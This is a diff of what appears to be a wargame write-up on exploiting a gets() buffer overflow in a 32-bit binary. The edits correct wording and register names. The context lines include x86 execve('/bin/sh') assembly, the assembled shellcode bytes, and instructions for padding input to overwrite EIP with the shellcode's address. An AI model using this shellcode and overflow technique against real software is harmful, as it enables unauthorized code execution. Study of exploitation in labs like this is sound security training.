@@ -43,7 +43,7 @@
 	   0x0804853e <+106>:	ret    
 	End of assembler dump.
 
-There is another vulnerable gets() call, however this time there is no useful function to exploit.
+There is another vulnerable gets() call, but this time there is no useful function to exploit.
 
 However, the stack is protected against buffer overflow, there is a check here that will exit if the memory has been overwritten :
 
@@ -125,7 +125,7 @@ Here our malicious asm code that will use the pop/call technique:
 		push	edx		; push NULL
 
 		; We need to push /bin/sh on the stack using a x86 architecture. So we need to push 4 bytes at a time, and in little endian number
-		; /bin is only 3 bytes so we add another /
+		; /bin/sh is only 7 bytes so we add another /  (we need 2x 4 bytes)
 		push	0x68732f6e	; hs/n
 		push	0x69622f2f	; ib// (1)
 		
@@ -185,7 +185,7 @@ To do so, we can use a small script. I am a lazy dude though, so i will instead 
 
 	\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80
 
-Now, we just need to pass this shellcode to the binary. At the same time, we also need to overwrite ESP with the malloc'd string address. To do so, our string needs to be 80 characters long + the last 4 characters to overflow ESP. Since our shellcode is (fortunately) shorter than 80 characters, we can add some padding until we reach 80 characters. I would recommend using 'Y' because it's such an underrated letter in my opinion, but any character will do the job.
+Now, we just need to pass this shellcode to the binary. At the same time, we also need to overwrite EIP with the malloc'd string address. To do so, our string needs to be 80 characters long + the last 4 characters to overflow EIP. Since our shellcode is (fortunately) shorter than 80 characters, we can add some padding until we reach 80 characters. I would recommend using 'Y' because it's such an underrated letter in my opinion, but any character will do the job.
 
 Here is our final payload :
 
